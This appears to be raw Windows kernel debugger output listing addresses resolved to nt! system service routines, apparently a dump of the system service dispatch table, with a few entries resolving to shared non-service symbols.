fffff80252a6f1e0 - nt!NtWaitForMultipleObjects (fffff802&#96;52a6f1e0)
fffff80252ae10c0 - nt!NtSetInformationObject (fffff802&#96;52ae10c0)
fffff80252aee0f0 - nt!NtCancelIoFile (fffff802&#96;52aee0f0)
fffff8025266c790 - nt!NtTraceEvent (fffff802&#96;5266c790)
fffff80252a495f0 - nt!NtPowerInformation (fffff802&#96;52a495f0)
fffff802529e3650 - nt!NtSetValueKey (fffff802&#96;529e3650)
fffff802526ffc70 - nt!NtCancelTimer (fffff802&#96;526ffc70)
fffff80252776b90 - nt!NtSetTimer (fffff802&#96;52776b90)
fffff80252744e80 - nt!NtAccessCheckByType (fffff802&#96;52744e80)
fffff802529909a0 - nt!NtAccessCheckByTypeResultList (fffff802&#96;529909a0)
fffff80252d1e060 - nt!NtAccessCheckByTypeResultListAndAuditAlarm (fffff802&#96;52d1e060)
fffff80252d1e110 - nt!NtAccessCheckByTypeResultListAndAuditAlarmByHandle (fffff802&#96;52d1e110)
fffff80252d53ac0 - nt!NtAcquireCrossVmMutant (fffff802&#96;52d53ac0)
fffff80252b1e8a0 - nt!NtAcquireProcessActivityReference (fffff802&#96;52b1e8a0)
fffff80252aefc50 - nt!NtAddAtomEx (fffff802&#96;52aefc50)
fffff80252d4fd30 - nt!NtAddBootEntry (fffff802&#96;52d4fd30)
fffff80252d4fd60 - nt!NtAddDriverEntry (fffff802&#96;52d4fd60)
fffff80252a30c60 - nt!NtAdjustGroupsToken (fffff802&#96;52a30c60)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff80252d094e0 - nt!NtAlertResumeThread (fffff802&#96;52d094e0)
fffff80252d09600 - nt!NtAlertThread (fffff802&#96;52d09600)
fffff80252a66150 - nt!NtAlertThreadByThreadId (fffff802&#96;52a66150)
fffff80252ada2d0 - nt!NtAllocateLocallyUniqueId (fffff802&#96;52ada2d0)
fffff80252b01750 - nt!NtAllocateReserveObject (fffff802&#96;52b01750)
fffff80252cd34f0 - nt!NtAllocateUserPhysicalPages (fffff802&#96;52cd34f0)
fffff80252cd3510 - nt!NtAllocateUserPhysicalPagesEx (fffff802&#96;52cd3510)
fffff80252b07730 - nt!NtAllocateUuids (fffff802&#96;52b07730)
fffff80252ab6340 - nt!NtAllocateVirtualMemoryEx (fffff802&#96;52ab6340)
fffff80252a2a050 - nt!NtAlpcAcceptConnectPort (fffff802&#96;52a2a050)
fffff80252b0e5b0 - nt!NtAlpcCancelMessage (fffff802&#96;52b0e5b0)
fffff80252a28560 - nt!NtAlpcConnectPort (fffff802&#96;52a28560)
fffff80252a285e0 - nt!NtAlpcConnectPortEx (fffff802&#96;52a285e0)
fffff80252af9a70 - nt!NtAlpcCreatePort (fffff802&#96;52af9a70)
fffff80252a0d140 - nt!NtAlpcCreatePortSection (fffff802&#96;52a0d140)
fffff80252ae2550 - nt!NtAlpcCreateResourceReserve (fffff802&#96;52ae2550)
fffff80252a0fde0 - nt!NtAlpcCreateSectionView (fffff802&#96;52a0fde0)
fffff80252adf250 - nt!NtAlpcCreateSecurityContext (fffff802&#96;52adf250)
fffff80252a48b30 - nt!NtAlpcDeletePortSection (fffff802&#96;52a48b30)
fffff80252cc01a0 - nt!NtAlpcDeleteResourceReserve (fffff802&#96;52cc01a0)
fffff80252a48a00 - nt!NtAlpcDeleteSectionView (fffff802&#96;52a48a00)
fffff80252a89990 - nt!NtAlpcDeleteSecurityContext (fffff802&#96;52a89990)
fffff80252afb310 - nt!NtAlpcDisconnectPort (fffff802&#96;52afb310)
fffff80252cbf2f0 - nt!NtAlpcImpersonateClientContainerOfPort (fffff802&#96;52cbf2f0)
fffff80252a878a0 - nt!NtAlpcImpersonateClientOfPort (fffff802&#96;52a878a0)
fffff80252a2c280 - nt!NtAlpcOpenSenderProcess (fffff802&#96;52a2c280)
fffff80252afb910 - nt!NtAlpcOpenSenderThread (fffff802&#96;52afb910)
fffff80252ad4a70 - nt!NtAlpcQueryInformation (fffff802&#96;52ad4a70)
fffff80252a257c0 - nt!NtAlpcQueryInformationMessage (fffff802&#96;52a257c0)
fffff80252cbf530 - nt!NtAlpcRevokeSecurityContext (fffff802&#96;52cbf530)
fffff80252a82200 - nt!NtAlpcSendWaitReceivePort (fffff802&#96;52a82200)
fffff80252af3c50 - nt!NtAlpcSetInformation (fffff802&#96;52af3c50)
fffff80252b0ac60 - nt!NtAreMappedFilesTheSame (fffff802&#96;52b0ac60)
fffff80252a57960 - nt!NtAssignProcessToJobObject (fffff802&#96;52a57960)
fffff8025270ee70 - nt!NtAssociateWaitCompletionPacket (fffff802&#96;5270ee70)
fffff802527ffe30 - nt!NtCallEnclave (fffff802&#96;527ffe30)
fffff80252aee2a0 - nt!NtCancelIoFileEx (fffff802&#96;52aee2a0)
fffff80252c919b0 - nt!NtCancelSynchronousIoFile (fffff802&#96;52c919b0)
fffff8025275f630 - nt!NtCancelTimer2 (fffff802&#96;5275f630)
fffff802526d56b0 - nt!NtCancelWaitCompletionPacket (fffff802&#96;526d56b0)
fffff802527ccfa0 - nt!NtCommitComplete (fffff802&#96;527ccfa0)
fffff802527ccfc0 - nt!NtCommitEnlistment (fffff802&#96;527ccfc0)
fffff80252a52c60 - nt!NtCommitRegistryTransaction (fffff802&#96;52a52c60)
fffff802527ccfe0 - nt!NtCommitTransaction (fffff802&#96;527ccfe0)
fffff80252c64d20 - nt!NtCompactKeys (fffff802&#96;52c64d20)
fffff80252aedb70 - nt!NtCompareObjects (fffff802&#96;52aedb70)
fffff80252b0a910 - nt!NtCompareSigningLevels (fffff802&#96;52b0a910)
fffff80252ae8020 - nt!NtCompareTokens (fffff802&#96;52ae8020)
fffff80252b0a310 - nt!ArbPreprocessEntry (fffff802&#96;52b0a310)
fffff80252c65000 - nt!NtCompressKey (fffff802&#96;52c65000)
fffff80252a2e3c0 - nt!NtConnectPort (fffff802&#96;52a2e3c0)
fffff802527f7900 - nt!NtContinueEx (fffff802&#96;527f7900)
fffff80252d577d0 - nt!NtConvertBetweenAuxiliaryCounterAndPerformanceCounter (fffff802&#96;52d577d0)
fffff80252d4c110 - nt!NtCreateCrossVmEvent (fffff802&#96;52d4c110)
fffff80252d53b90 - nt!NtCreateCrossVmMutant (fffff802&#96;52d53b90)
fffff80252c82df0 - nt!NtCreateDebugObject (fffff802&#96;52c82df0)
fffff80252af2060 - nt!NtCreateDirectoryObject (fffff802&#96;52af2060)
fffff80252af2040 - nt!NtCreateDirectoryObjectEx (fffff802&#96;52af2040)
fffff80252cd0a50 - nt!NtCreateEnclave (fffff802&#96;52cd0a50)
fffff802527cd000 - nt!NtCreateEnlistment (fffff802&#96;527cd000)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff80252b7c0b0 - nt!NtCreateIRTimer (fffff802&#96;52b7c0b0)
fffff80252aa6930 - nt!NtCreateIoCompletion (fffff802&#96;52aa6930)
fffff80252a56b20 - nt!NtCreateJobObject (fffff802&#96;52a56b20)
fffff80252b13470 - nt!ArbAddReserved (fffff802&#96;52b13470)
fffff80252b56f30 - nt!NtCreateKeyTransacted (fffff802&#96;52b56f30)
fffff80252bb2660 - nt!NtCreateKeyedEvent (fffff802&#96;52bb2660)
fffff80252aba860 - nt!NtCreateLowBoxToken (fffff802&#96;52aba860)
fffff802529cf5b0 - nt!NtCreateMailslotFile (fffff802&#96;529cf5b0)
fffff80252acad90 - nt!NtCreateMutant (fffff802&#96;52acad90)
fffff80252afdea0 - nt!NtCreateNamedPipeFile (fffff802&#96;52afdea0)
fffff80252ba1cb0 - nt!NtCreatePagingFile (fffff802&#96;52ba1cb0)
fffff80252d09cd0 - nt!NtCreatePartition (fffff802&#96;52d09cd0)
fffff80252b600a0 - nt!NtCreatePort (fffff802&#96;52b600a0)
fffff80252af3680 - nt!NtCreatePrivateNamespace (fffff802&#96;52af3680)
fffff80252d03e40 - nt!NtCreateProcess (fffff802&#96;52d03e40)
fffff80252d57900 - nt!NtCreateProfile (fffff802&#96;52d57900)
fffff80252d579e0 - nt!NtCreateProfileEx (fffff802&#96;52d579e0)
fffff80252b0b700 - nt!NtCreateRegistryTransaction (fffff802&#96;52b0b700)
fffff802527cd020 - nt!NtCreateResourceManager (fffff802&#96;527cd020)
fffff80252cc4720 - nt!NtCreateSectionEx (fffff802&#96;52cc4720)
fffff80252aafd40 - nt!NtCreateSemaphore (fffff802&#96;52aafd40)
fffff80252afae50 - nt!NtCreateSymbolicLinkObject (fffff802&#96;52afae50)
fffff80252ab0fb0 - nt!NtCreateThreadEx (fffff802&#96;52ab0fb0)
fffff80252aabb40 - nt!NtCreateTimer (fffff802&#96;52aabb40)
fffff80252a0e550 - nt!NtCreateTimer2 (fffff802&#96;52a0e550)
fffff80252d1f5f0 - nt!NtCreateToken (fffff802&#96;52d1f5f0)
fffff80252a2f3e0 - nt!NtCreateTokenEx (fffff802&#96;52a2f3e0)
fffff802527cd040 - nt!NtCreateTransaction (fffff802&#96;527cd040)
fffff802527cd060 - nt!NtCreateTransactionManager (fffff802&#96;527cd060)
fffff80252a143e0 - nt!NtCreateUserProcess (fffff802&#96;52a143e0)
fffff80252ae32a0 - nt!NtCreateWaitCompletionPacket (fffff802&#96;52ae32a0)
fffff80252b7b8f0 - nt!NtCreateWaitablePort (fffff802&#96;52b7b8f0)
fffff80252a25da0 - nt!NtCreateWnfStateName (fffff802&#96;52a25da0)
fffff80252a0cd70 - nt!NtCreateWorkerFactory (fffff802&#96;52a0cd70)
fffff80252c82ff0 - nt!NtDebugActiveProcess (fffff802&#96;52c82ff0)
fffff80252c831c0 - nt!NtDebugContinue (fffff802&#96;52c831c0)
fffff80252af1380 - nt!NtDeleteAtom (fffff802&#96;52af1380)
fffff80252d4fd90 - nt!NtDeleteBootEntry (fffff802&#96;52d4fd90)
fffff80252d4ff20 - nt!NtDeleteDriverEntry (fffff802&#96;52d4ff20)
fffff80252b69e40 - nt!NtDeleteFile (fffff802&#96;52b69e40)
fffff80252a43680 - nt!NtDeleteKey (fffff802&#96;52a43680)
fffff80252b22270 - nt!NtDeleteObjectAuditAlarm (fffff802&#96;52b22270)
fffff80252cdc320 - nt!NtDeletePrivateNamespace (fffff802&#96;52cdc320)
fffff802529dd640 - nt!NtDeleteValueKey (fffff802&#96;529dd640)
fffff80252bba370 - nt!NtDeleteWnfStateData (fffff802&#96;52bba370)
fffff80252a20c30 - nt!NtDeleteWnfStateName (fffff802&#96;52a20c30)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff80252b6a3c0 - nt!NtDisableLastKnownGood (fffff802&#96;52b6a3c0)
fffff80252d49220 - nt!NtDisplayString (fffff802&#96;52d49220)
fffff802529ad330 - nt!NtDrawText (fffff802&#96;529ad330)
fffff80252b695e0 - nt!NtEnableLastKnownGood (fffff802&#96;52b695e0)
fffff80252d500b0 - nt!NtEnumerateBootEntries (fffff802&#96;52d500b0)
fffff80252d50700 - nt!NtEnumerateDriverEntries (fffff802&#96;52d50700)
fffff80252d50bc0 - nt!NtEnumerateSystemEnvironmentValuesEx (fffff802&#96;52d50bc0)
fffff802527cd080 - nt!NtEnumerateTransactionObject (fffff802&#96;527cd080)
fffff80252b07a00 - nt!NtExtendSection (fffff802&#96;52b07a00)
fffff80252d20ae0 - nt!NtFilterBootOption (fffff802&#96;52d20ae0)
fffff80252a31cf0 - nt!NtFilterToken (fffff802&#96;52a31cf0)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff80252ae7840 - nt!NtFlushBuffersFileEx (fffff802&#96;52ae7840)
fffff80252bbc610 - nt!NtFlushInstallUILanguage (fffff802&#96;52bbc610)
fffff80252b0a310 - nt!ArbPreprocessEntry (fffff802&#96;52b0a310)
fffff80252b02090 - nt!NtFlushKey (fffff802&#96;52b02090)
fffff802526fcee0 - nt!NtFlushProcessWriteBuffers (fffff802&#96;526fcee0)
fffff80252aff030 - nt!NtFlushVirtualMemory (fffff802&#96;52aff030)
fffff80252b0a310 - nt!ArbPreprocessEntry (fffff802&#96;52b0a310)
fffff80252cd3530 - nt!NtFreeUserPhysicalPages (fffff802&#96;52cd3530)
fffff80252c651e0 - nt!NtFreezeRegistry (fffff802&#96;52c651e0)
fffff802527cd0a0 - nt!NtFreezeTransactions (fffff802&#96;527cd0a0)
fffff80252aef050 - nt!NtGetCachedSigningLevel (fffff802&#96;52aef050)
fffff80252a21440 - nt!NtGetCompleteWnfStateSubscription (fffff802&#96;52a21440)
fffff80252b0b580 - nt!NtGetContextThread (fffff802&#96;52b0b580)
fffff80252d046f0 - nt!NtGetCurrentProcessorNumber (fffff802&#96;52d046f0)
fffff80252d04750 - nt!NtGetCurrentProcessorNumberEx (fffff802&#96;52d04750)
fffff80252ced290 - nt!NtGetDevicePowerState (fffff802&#96;52ced290)
fffff80252aed1b0 - nt!NtGetMUIRegistryInfo (fffff802&#96;52aed1b0)
fffff80252b77c80 - nt!NtGetNextProcess (fffff802&#96;52b77c80)
fffff80252b02a10 - nt!NtGetNextThread (fffff802&#96;52b02a10)
fffff80252afe900 - nt!NtGetNlsSectionPtr (fffff802&#96;52afe900)
fffff802527cd0c0 - nt!NtGetNotificationResourceManager (fffff802&#96;527cd0c0)
fffff80252636e30 - nt!NtGetWriteWatch (fffff802&#96;52636e30)
fffff80252a30630 - nt!NtImpersonateAnonymousToken (fffff802&#96;52a30630)
fffff80252aca470 - nt!NtImpersonateThread (fffff802&#96;52aca470)
fffff80252cd0ea0 - nt!NtInitializeEnclave (fffff802&#96;52cd0ea0)
fffff80252a5c910 - nt!NtInitializeNlsFiles (fffff802&#96;52a5c910)
fffff80252b7a8d0 - nt!NtInitializeRegistry (fffff802&#96;52b7a8d0)
fffff80252b621b0 - nt!NtInitiatePowerAction (fffff802&#96;52b621b0)
fffff80252b66cc0 - nt!NtIsSystemResumeAutomatic (fffff802&#96;52b66cc0)
fffff80252b5f2f0 - nt!NtIsUILanguageComitted (fffff802&#96;52b5f2f0)
fffff80252bc0d60 - nt!NtListenPort (fffff802&#96;52bc0d60)
fffff80252b6d7a0 - nt!NtLoadDriver (fffff802&#96;52b6d7a0)
fffff80252cd1180 - nt!NtLoadEnclaveData (fffff802&#96;52cd1180)
fffff80252b6ef50 - nt!NtLoadKey (fffff802&#96;52b6ef50)
fffff80252b6eef0 - nt!NtLoadKey2 (fffff802&#96;52b6eef0)
fffff80252a50870 - nt!NtLoadKeyEx (fffff802&#96;52a50870)
fffff80252a9ec90 - nt!NtLockFile (fffff802&#96;52a9ec90)
fffff80252b9f420 - nt!NtLockProductActivationKeys (fffff802&#96;52b9f420)
fffff80252bb0380 - nt!NtLockRegistryKey (fffff802&#96;52bb0380)
fffff8025264cec0 - nt!NtLockVirtualMemory (fffff802&#96;5264cec0)
fffff80252b1f0a0 - nt!NtMakePermanentObject (fffff802&#96;52b1f0a0)
fffff80252b0a7e0 - nt!NtMakeTemporaryObject (fffff802&#96;52b0a7e0)
fffff80252ccba70 - nt!NtManageHotPatch (fffff802&#96;52ccba70)
fffff80252a1c460 - nt!NtManagePartition (fffff802&#96;52a1c460)
fffff80252d56810 - nt!NtMapCMFModule (fffff802&#96;52d56810)
fffff80252cd3a10 - nt!NtMapUserPhysicalPages (fffff802&#96;52cd3a10)
fffff80252b0a730 - nt!NtMapViewOfSectionEx (fffff802&#96;52b0a730)
fffff80252d50e80 - nt!NtModifyBootEntry (fffff802&#96;52d50e80)
fffff80252d50eb0 - nt!NtModifyDriverEntry (fffff802&#96;52d50eb0)
fffff80252afc740 - nt!NtNotifyChangeDirectoryFile (fffff802&#96;52afc740)
fffff80252afc7a0 - nt!NtNotifyChangeDirectoryFileEx (fffff802&#96;52afc7a0)
fffff802529e2150 - nt!NtNotifyChangeKey (fffff802&#96;529e2150)
fffff802529e2200 - nt!NtNotifyChangeMultipleKeys (fffff802&#96;529e2200)
fffff80252ae4140 - nt!NtNotifyChangeSession (fffff802&#96;52ae4140)
fffff802527cd0e0 - nt!NtOpenEnlistment (fffff802&#96;527cd0e0)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff80252c91700 - nt!NtOpenIoCompletion (fffff802&#96;52c91700)
fffff802529cfac0 - nt!NtOpenJobObject (fffff802&#96;529cfac0)
fffff80252a93720 - nt!NtOpenKeyEx (fffff802&#96;52a93720)
fffff80252c65280 - nt!NtOpenKeyTransacted (fffff802&#96;52c65280)
fffff80252a52f40 - nt!NtOpenKeyTransactedEx (fffff802&#96;52a52f40)
fffff80252d57e30 - nt!NtOpenKeyedEvent (fffff802&#96;52d57e30)
fffff80252af0cc0 - nt!NtOpenMutant (fffff802&#96;52af0cc0)
fffff80252af8be0 - nt!NtOpenObjectAuditAlarm (fffff802&#96;52af8be0)
fffff80252bbe550 - nt!NtOpenPartition (fffff802&#96;52bbe550)
fffff80252af34b0 - nt!NtOpenPrivateNamespace (fffff802&#96;52af34b0)
fffff80252a66a70 - nt!NtOpenProcessToken (fffff802&#96;52a66a70)
fffff80252c652a0 - nt!NtOpenRegistryTransaction (fffff802&#96;52c652a0)
fffff802527cd100 - nt!NtOpenResourceManager (fffff802&#96;527cd100)
fffff80252af1e80 - nt!NtOpenSemaphore (fffff802&#96;52af1e80)
fffff80252b0d830 - nt!NtOpenSession (fffff802&#96;52b0d830)
fffff80252ad7f10 - nt!NtOpenSymbolicLinkObject (fffff802&#96;52ad7f10)
fffff80252a661c0 - nt!NtOpenThread (fffff802&#96;52a661c0)
fffff80252d4bf00 - nt!NtOpenTimer (fffff802&#96;52d4bf00)
fffff802527cd120 - nt!NtOpenTransaction (fffff802&#96;527cd120)
fffff802527cd140 - nt!NtOpenTransactionManager (fffff802&#96;527cd140)
fffff802529d8ef0 - nt!NtPlugPlayControl (fffff802&#96;529d8ef0)
fffff802527cd160 - nt!NtPrePrepareComplete (fffff802&#96;527cd160)
fffff802527cd180 - nt!NtPrePrepareEnlistment (fffff802&#96;527cd180)
fffff802527cd1a0 - nt!NtPrepareComplete (fffff802&#96;527cd1a0)
fffff802527cd1c0 - nt!NtPrepareEnlistment (fffff802&#96;527cd1c0)
fffff80252a17f00 - nt!NtPrivilegeCheck (fffff802&#96;52a17f00)
fffff80252b78df0 - nt!NtPrivilegeObjectAuditAlarm (fffff802&#96;52b78df0)
fffff80252b057c0 - nt!NtPrivilegedServiceAuditAlarm (fffff802&#96;52b057c0)
fffff802527cd1e0 - nt!NtPropagationComplete (fffff802&#96;527cd1e0)
fffff802527cd200 - nt!NtPropagationFailed (fffff802&#96;527cd200)
fffff80252d58c30 - nt!NtPssCaptureVaSpaceBulk (fffff802&#96;52d58c30)
fffff80252aae8e0 - nt!NtPulseEvent (fffff802&#96;52aae8e0)
fffff80252d57a50 - nt!NtQueryAuxiliaryCounterFrequency (fffff802&#96;52d57a50)
fffff80252d50ee0 - nt!NtQueryBootEntryOrder (fffff802&#96;52d50ee0)
fffff80252d51160 - nt!NtQueryBootOptions (fffff802&#96;52d51160)
fffff80252761440 - nt!NtQueryDebugFilterState (fffff802&#96;52761440)
fffff80252a8c710 - nt!NtQueryDirectoryFileEx (fffff802&#96;52a8c710)
fffff80252a8aa10 - nt!NtQueryDirectoryObject (fffff802&#96;52a8aa10)
fffff80252d51460 - nt!NtQueryDriverEntryOrder (fffff802&#96;52d51460)
fffff80252ae9f70 - nt!NtQueryEaFile (fffff802&#96;52ae9f70)
fffff80252a161c0 - nt!NtQueryFullAttributesFile (fffff802&#96;52a161c0)
fffff80252aef9e0 - nt!NtQueryInformationAtom (fffff802&#96;52aef9e0)
fffff80252c91aa0 - nt!NtQueryInformationByName (fffff802&#96;52c91aa0)
fffff802527cd220 - nt!NtQueryInformationEnlistment (fffff802&#96;527cd220)
fffff80252a98850 - nt!NtQueryInformationJobObject (fffff802&#96;52a98850)
fffff80252cbedd0 - nt!NtQueryInformationPort (fffff802&#96;52cbedd0)
fffff802527cd240 - nt!NtQueryInformationResourceManager (fffff802&#96;527cd240)
fffff802527cd260 - nt!NtQueryInformationTransaction (fffff802&#96;527cd260)
fffff802527cd280 - nt!NtQueryInformationTransactionManager (fffff802&#96;527cd280)
fffff802529b43b0 - nt!NtQueryInformationWorkerFactory (fffff802&#96;529b43b0)
fffff80252b01a70 - nt!NtQueryInstallUILanguage (fffff802&#96;52b01a70)
fffff80252b21860 - nt!NtQueryIntervalProfile (fffff802&#96;52b21860)
fffff80252c91820 - nt!NtQueryIoCompletion (fffff802&#96;52c91820)
fffff80252a57dc0 - nt!NtQueryLicenseValue (fffff802&#96;52a57dc0)
fffff80252a54790 - nt!NtQueryMultipleValueKey (fffff802&#96;52a54790)
fffff80252d53c40 - nt!NtQueryMutant (fffff802&#96;52d53c40)
fffff80252c653f0 - nt!NtQueryOpenSubKeys (fffff802&#96;52c653f0)
fffff80252c65610 - nt!NtQueryOpenSubKeysEx (fffff802&#96;52c65610)
fffff80252b13480 - nt!CmpCleanUpHigherLayerKcbCachesPreCallback (fffff802&#96;52b13480)
fffff80252c92c50 - nt!NtQueryQuotaInformationFile (fffff802&#96;52c92c50)
fffff80252a814e0 - nt!NtQuerySecurityAttributesToken (fffff802&#96;52a814e0)
fffff80252adb2d0 - nt!NtQuerySecurityObject (fffff802&#96;52adb2d0)
fffff80252d18a60 - nt!NtQuerySecurityPolicy (fffff802&#96;52d18a60)
fffff80252d53800 - nt!NtQuerySemaphore (fffff802&#96;52d53800)
fffff80252ad8060 - nt!NtQuerySymbolicLinkObject (fffff802&#96;52ad8060)
fffff80252d51790 - nt!NtQuerySystemEnvironmentValue (fffff802&#96;52d51790)
fffff80252b0d9d0 - nt!NtQuerySystemEnvironmentValueEx (fffff802&#96;52b0d9d0)
fffff80252ae9b60 - nt!NtQuerySystemInformationEx (fffff802&#96;52ae9b60)
fffff80252b0bf00 - nt!NtQueryTimerResolution (fffff802&#96;52b0bf00)
fffff80252a22ab0 - nt!NtQueryWnfStateData (fffff802&#96;52a22ab0)
fffff80252af6230 - nt!NtQueryWnfStateNameInformation (fffff802&#96;52af6230)
fffff80252ab36d0 - nt!NtQueueApcThreadEx (fffff802&#96;52ab36d0)
fffff802527f7bc0 - nt!NtRaiseException (fffff802&#96;527f7bc0)
fffff80252d534b0 - nt!NtRaiseHardError (fffff802&#96;52d534b0)
fffff802527cd2a0 - nt!NtReadOnlyEnlistment (fffff802&#96;527cd2a0)
fffff802527cd2c0 - nt!NtRecoverEnlistment (fffff802&#96;527cd2c0)
fffff802527cd2e0 - nt!NtRecoverResourceManager (fffff802&#96;527cd2e0)
fffff802527cd300 - nt!NtRecoverTransactionManager (fffff802&#96;527cd300)
fffff802527cd820 - nt!NtRegisterProtocolAddressInformation (fffff802&#96;527cd820)
fffff80252b0ba10 - nt!NtRegisterThreadTerminatePort (fffff802&#96;52b0ba10)
fffff80252d57f30 - nt!NtReleaseKeyedEvent (fffff802&#96;52d57f30)
fffff802526823b0 - nt!NtReleaseWorkerFactoryWorker (fffff802&#96;526823b0)
fffff802529f76f0 - nt!NtRemoveIoCompletionEx (fffff802&#96;529f76f0)
fffff80252c833c0 - nt!NtRemoveProcessDebug (fffff802&#96;52c833c0)
fffff80252c65950 - nt!NtRenameKey (fffff802&#96;52c65950)
fffff802527cd840 - nt!NtRenameTransactionManager (fffff802&#96;527cd840)
fffff80252c65e50 - nt!NtReplaceKey (fffff802&#96;52c65e50)
fffff802529c4c70 - nt!NtReplacePartitionUnit (fffff802&#96;529c4c70)
fffff80252cbef00 - nt!NtReplyWaitReplyPort (fffff802&#96;52cbef00)
fffff80252b00200 - nt!NtRequestPort (fffff802&#96;52b00200)
fffff80252abcd30 - nt!NtResetEvent (fffff802&#96;52abcd30)
fffff802529f85f0 - nt!NtResetWriteWatch (fffff802&#96;529f85f0)
fffff80252c661e0 - nt!NtRestoreKey (fffff802&#96;52c661e0)
fffff80252d09680 - nt!NtResumeProcess (fffff802&#96;52d09680)
fffff8025297cb30 - nt!NtRevertContainerImpersonation (fffff802&#96;5297cb30)
fffff802527cd320 - nt!NtRollbackComplete (fffff802&#96;527cd320)
fffff802527cd340 - nt!NtRollbackEnlistment (fffff802&#96;527cd340)
fffff80252b20d80 - nt!NtRollbackRegistryTransaction (fffff802&#96;52b20d80)
fffff802527cd360 - nt!NtRollbackTransaction (fffff802&#96;527cd360)
fffff802527cd8a0 - nt!NtRollforwardTransactionManager (fffff802&#96;527cd8a0)
fffff80252c66490 - nt!NtSaveKey (fffff802&#96;52c66490)
fffff80252b16790 - nt!NtSaveKeyEx (fffff802&#96;52b16790)
fffff80252c664b0 - nt!NtSaveMergedKeys (fffff802&#96;52c664b0)
fffff80252a2dcc0 - nt!NtSecureConnectPort (fffff802&#96;52a2dcc0)
fffff80252bbf3e0 - nt!NtSerializeBoot (fffff802&#96;52bbf3e0)
fffff80252d51ab0 - nt!NtSetBootEntryOrder (fffff802&#96;52d51ab0)
fffff80252d51cc0 - nt!NtSetBootOptions (fffff802&#96;52d51cc0)
fffff80252b18380 - nt!NtSetCachedSigningLevel (fffff802&#96;52b18380)
fffff80252b183b0 - nt!NtSetCachedSigningLevel2 (fffff802&#96;52b183b0)
fffff80252d082d0 - nt!NtSetContextThread (fffff802&#96;52d082d0)
fffff80252b8e010 - nt!NtSetDebugFilterState (fffff802&#96;52b8e010)
fffff80252bbee70 - nt!NtSetDefaultHardErrorPort (fffff802&#96;52bbee70)
fffff80252b79220 - nt!NtSetDefaultLocale (fffff802&#96;52b79220)
fffff80252b79200 - nt!NtSetDefaultUILanguage (fffff802&#96;52b79200)
fffff80252d51ed0 - nt!NtSetDriverEntryOrder (fffff802&#96;52d51ed0)
fffff80252b1e380 - nt!NtSetEaFile (fffff802&#96;52b1e380)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff8025275fc50 - nt!NtSetIRTimer (fffff802&#96;5275fc50)
fffff80252c83530 - nt!NtSetInformationDebugObject (fffff802&#96;52c83530)
fffff802527cd380 - nt!NtSetInformationEnlistment (fffff802&#96;527cd380)
fffff80252a1a940 - nt!NtSetInformationJobObject (fffff802&#96;52a1a940)
fffff80252a71fc0 - nt!NtSetInformationKey (fffff802&#96;52a71fc0)
fffff802527cd3a0 - nt!NtSetInformationResourceManager (fffff802&#96;527cd3a0)
fffff80252cd9960 - nt!NtSetInformationSymbolicLink (fffff802&#96;52cd9960)
fffff80252ab9460 - nt!NtSetInformationToken (fffff802&#96;52ab9460)
fffff802527cd3c0 - nt!NtSetInformationTransaction (fffff802&#96;527cd3c0)
fffff802527cd860 - nt!NtSetInformationTransactionManager (fffff802&#96;527cd860)
fffff80252a06330 - nt!NtSetInformationVirtualMemory (fffff802&#96;52a06330)
fffff80252666350 - nt!NtSetInformationWorkerFactory (fffff802&#96;52666350)
fffff80252b21b20 - nt!NtSetIntervalProfile (fffff802&#96;52b21b20)
fffff80252ae4590 - nt!NtSetIoCompletion (fffff802&#96;52ae4590)
fffff80252a72920 - nt!NtSetIoCompletionEx (fffff802&#96;52a72920)
fffff802527ccce0 - nt!BvgaSetVirtualFrameBuffer (fffff802&#96;527ccce0)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff80252b13570 - nt!NT_DISK::GetPnpProperty (fffff802&#96;52b13570)
fffff80252c93360 - nt!NtSetQuotaInformationFile (fffff802&#96;52c93360)
fffff80252a26780 - nt!NtSetSecurityObject (fffff802&#96;52a26780)
fffff80252d520e0 - nt!NtSetSystemEnvironmentValue (fffff802&#96;52d520e0)
fffff80252d52400 - nt!NtSetSystemEnvironmentValueEx (fffff802&#96;52d52400)
fffff80252aa9c30 - nt!NtSetSystemInformation (fffff802&#96;52aa9c30)
fffff80252d956b0 - nt!NtSetSystemPowerState (fffff802&#96;52d956b0)
fffff80252d48ab0 - nt!NtSetSystemTime (fffff802&#96;52d48ab0)
fffff80252a4e8c0 - nt!NtSetThreadExecutionState (fffff802&#96;52a4e8c0)
fffff8025267ed40 - nt!NtSetTimer2 (fffff802&#96;5267ed40)
fffff80252611310 - nt!NtSetTimerEx (fffff802&#96;52611310)
fffff80252aa8f90 - nt!NtSetTimerResolution (fffff802&#96;52aa8f90)
fffff80252bb3ee0 - nt!NtSetUuidSeed (fffff802&#96;52bb3ee0)
fffff80252b5a260 - nt!NtSetVolumeInformationFile (fffff802&#96;52b5a260)
fffff80252af7bc0 - nt!NtSetWnfProcessNotificationEvent (fffff802&#96;52af7bc0)
fffff802529ad4b0 - nt!NtShutdownSystem (fffff802&#96;529ad4b0)
fffff802527582e0 - nt!NtShutdownWorkerFactory (fffff802&#96;527582e0)
fffff8025295f620 - nt!NtSignalAndWaitForSingleObject (fffff802&#96;5295f620)
fffff802527cd880 - nt!NtSinglePhaseReject (fffff802&#96;527cd880)
fffff80252d57ac0 - nt!NtStartProfile (fffff802&#96;52d57ac0)
fffff80252d57d30 - nt!NtStopProfile (fffff802&#96;52d57d30)
fffff80252a22650 - nt!NtSubscribeWnfStateChange (fffff802&#96;52a22650)
fffff80252d09700 - nt!NtSuspendProcess (fffff802&#96;52d09700)
fffff80252b093a0 - nt!NtSuspendThread (fffff802&#96;52b093a0)
fffff80252bbc780 - nt!NtSystemDebugControl (fffff802&#96;52bbc780)
fffff80252cd1800 - nt!NtTerminateEnclave (fffff802&#96;52cd1800)
fffff80252a55dc0 - nt!NtTerminateJobObject (fffff802&#96;52a55dc0)
fffff80252af9a40 - nt!NtTestAlert (fffff802&#96;52af9a40)
fffff80252c666f0 - nt!NtThawRegistry (fffff802&#96;52c666f0)
